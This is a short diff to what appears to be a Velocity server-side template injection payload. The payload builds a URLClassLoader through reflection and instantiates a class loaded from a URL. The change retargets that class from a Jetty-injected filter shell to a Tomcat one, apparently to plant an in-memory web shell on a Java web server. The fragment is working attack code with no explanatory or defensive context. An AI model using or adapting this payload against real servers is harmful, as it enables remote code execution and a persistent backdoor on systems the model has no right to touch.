@@ -26,6 +26,6 @@ $array.set($urlArray,0,$url222)
 $array.set($objArray,0,$urlArray)
 #set($urlclassloader=$url00.newInstance($objArray))
 #set($loadClass=$url0.getMethod('loadClass',$x.class.forName('java.lang.String')))
-#set($obj=$loadClass.invoke($urlclassloader,'Inject.JettyInjectFilterShell').newInstance())
+#set($obj=$loadClass.invoke($urlclassloader,'Inject.TomcatInjectFilterShell').newInstance())
 #end
 #end
